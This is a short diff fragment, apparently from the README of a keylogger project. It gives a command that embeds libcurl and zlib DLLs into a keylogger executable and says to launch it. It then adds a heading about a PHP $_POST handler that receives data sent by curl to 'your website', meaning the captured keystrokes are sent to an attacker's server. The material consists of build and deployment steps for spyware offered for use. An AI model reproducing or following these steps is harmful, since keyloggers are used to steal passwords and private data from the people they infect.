@@ -19,3 +19,5 @@
 * <code> pefrmdllembed.exe -impinj KeyloggerV1.exe libcurl-d.dll zlibd1.dll <NameKeylogger.exe> </code>
 * Launch <NameKeylogger.exe>
 
+
+### $_POST['text'] matching request curl for receive data on your website
